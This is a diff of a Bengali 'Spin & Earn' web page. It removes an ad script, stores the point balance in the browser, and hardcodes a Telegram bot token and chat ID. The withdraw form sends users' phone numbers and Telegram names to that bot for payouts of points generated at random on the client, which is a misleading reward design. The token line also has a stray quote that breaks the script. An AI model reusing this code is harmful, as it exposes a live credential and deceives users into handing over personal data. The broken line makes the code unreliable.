@@ -4,138 +4,82 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Spin & Earn</title>
-    <script src="//whephiwums.com/vignette.min.js" data-zone="8806288" data-sdk="show_8806288"></script>
     <style>
-        /* ব্যাকগ্রাউন্ড ইমেজ */
         body, html {
             margin: 0;
             padding: 0;
             height: 100%;
-            overflow: hidden;
-            font-family: 'Arial', sans-serif;
-        }
-
-        .background-image {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: url('https://i.postimg.cc/FKJbP12Z/rm21-texture-jite-47.jpg');
-            background-size: cover;
-            background-position: center;
-            z-index: -1;
-            filter: blur(5px);
-        }
-
-        body {
             text-align: center;
-            background-color: rgba(0, 0, 0, 0.7);
+            font-family: Arial, sans-serif;
+            background-color: #000;
             color: white;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
         }
 
         .container {
-            background-color: rgba(255, 255, 255, 0.9);
+            margin-top: 20px;
+            background-color: rgba(255, 255, 255, 0.8);
             color: black;
-            padding: 30px;
-            border-radius: 15px;
+            padding: 20px;
+            border-radius: 10px;
             width: 80%;
-            max-width: 700px;
-            z-index: 1;
-            position: relative;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            margin: auto;
+            backdrop-filter: blur(5px);
         }
 
         .wallet {
-            font-size: 24px;
+            font-size: 20px;
             font-weight: bold;
             margin-bottom: 20px;
         }
 
-        .spin-button, .withdraw-button, .join-button {
+        .spin-button, .withdraw-button {
             background-color: #28a745;
             color: white;
-            padding: 12px 18px;
+            padding: 10px 15px;
             border: none;
             cursor: pointer;
-            font-size: 20px;
-            margin: 10px;
+            font-size: 18px;
+            margin: 5px;
             border-radius: 50px;
-            transition: background-color 0.3s ease;
-        }
-
-        .join-button {
-            background-color: #0088cc;
-        }
-
-        .spin-button:hover, .withdraw-button:hover, .join-button:hover {
-            background-color: #218838;
         }
 
         .wheel-container {
-            width: 250px;
-            height: 250px;
-            margin: 30px auto;
+            width: 150px;
+            height: 150px;
+            margin: auto;
         }
 
         .wheel {
             width: 100%;
             height: 100%;
             border-radius: 50%;
-            border: 8px solid #ffcc00;
-            background: conic-gradient(
-                red 0deg 60deg, yellow 60deg 120deg, green 120deg 180deg,
-                blue 180deg 240deg, orange 240deg 300deg, purple 300deg 360deg
-            );
+            border: 5px solid #ffcc00;
+            background: conic-gradient(red 0deg 60deg, yellow 60deg 120deg, green 120deg 180deg, blue 180deg 240deg, orange 240deg 300deg, purple 300deg 360deg);
             transition: transform 3s ease-out;
         }
 
         .withdraw-form {
             display: none;
-            margin-top: 20px;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            background-color: white;
+            padding: 10px;
+            border-radius: 5px;
+            width: 90%;
+            margin: auto;
+            margin-top: 10px;
         }
 
         input, select, button {
-            padding: 10px;
-            margin: 10px 0;
-            width: 80%;
-            border-radius: 5px;
-            border: 1px solid #ddd;
-        }
-
-        .withdraw-button {
-            background-color: #28a745;
-            padding: 15px 25px;
-            font-size: 20px;
-            margin: 20px 0;
-        }
-
-        .developer-info {
-            margin-top: 30px;
-            font-size: 18px;
-            color: #ccc;
+            padding: 8px;
+            margin: 5px;
+            width: 90%;
         }
     </style>
 </head>
 <body>
 
-    <div class="background-image"></div>
-
     <div class="container">
         <h2>Spin & Earn</h2>
-        <h3>Developed by Technical Tom</h3>
         <div class="wallet">আপনার ব্যালেন্স: <span id="balance">0</span> পয়েন্ট</div>
 
         <div class="wheel-container">
@@ -143,7 +87,6 @@
         </div>
 
         <button class="spin-button" onclick="spin()">Spin করুন</button>
-
         <button class="withdraw-button" onclick="showWithdrawForm()">উইথড্র রিকোয়েস্ট</button>
 
         <div class="withdraw-form" id="withdrawForm">
@@ -159,14 +102,13 @@
             <input type="number" id="withdrawAmount" placeholder="💰 কত পয়েন্ট উইথড্র করতে চান?">
             <button onclick="withdraw()">✅ উইথড্র করুন</button>
         </div>
-
-        <div class="developer-info">
-            <p>সব সেবা প্রাপ্তির জন্য আমাদের সাথে যোগাযোগ করুন।</p>
-        </div>
     </div>
 
     <script>
-        let balance = 0;
+        // LocalStorage থেকে ব্যালেন্স লোড করুন
+        let balance = localStorage.getItem("balance") ? parseInt(localStorage.getItem("balance")) : 0;
+        document.getElementById("balance").innerText = balance;
+
         let isSpinning = false;
 
         function spin() {
@@ -176,20 +118,16 @@
             let wheel = document.getElementById("wheel");
             let points = [10, 15, 25, 30, 50, 100];
             let earned = points[Math.floor(Math.random() * points.length)];
-            
+
             let randomDegree = 3600 + (Math.floor(Math.random() * 360));
             wheel.style.transform = `rotate(${randomDegree}deg)`;
 
             setTimeout(() => {
                 balance += earned;
+                localStorage.setItem("balance", balance);
                 document.getElementById("balance").innerText = balance;
                 alert("✅ আপনি " + earned + " পয়েন্ট পেয়েছেন!");
                 isSpinning = false;
-
-                show_8806288().then(() => {
-                    alert('✅ আপনি বিজ্ঞাপন দেখেছেন!');
-                });
-
             }, 3000);
         }
 
@@ -200,11 +138,11 @@
 
         function withdraw() {
             let telegramUsername = document.getElementById("telegramUsername").value;
-            let withdrawAmount = document.getElementById("withdrawAmount").value;
+            let withdrawAmount = parseInt(document.getElementById("withdrawAmount").value);
             let number = document.getElementById("number").value;
             let method = document.getElementById("method").value;
 
-            if (telegramUsername === "" || withdrawAmount === "" || number === "") {
+            if (!telegramUsername || !withdrawAmount || !number) {
                 alert("⚠️ দয়া করে সব তথ্য দিন!");
                 return;
             }
@@ -226,12 +164,13 @@
             alert("✅ উইথড্র রিকয়েস্ট পাঠানো হয়েছে!");
 
             balance -= withdrawAmount;
+            localStorage.setItem("balance", balance);
             document.getElementById("balance").innerText = balance;
         }
 
         function sendToTelegram(message) {
-            const botToken = "YOUR_BOT_TOKEN";  // আপনার বটের টোকেন দিন
-            const chatId = "YOUR_CHAT_ID"; // আপনার টেলিগ্রাম ইউজার আইডি দিন
+            const botToken = "6290805775:AAFLAUpr4pCYDsDpC8CBRUuBUjIEAvEn1o0"";  // আপনার বটের টোকেন দিন
+            const chatId = "1647354354"; // আপনার টেলিগ্রাম ইউজার আইডি দিন
 
             let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
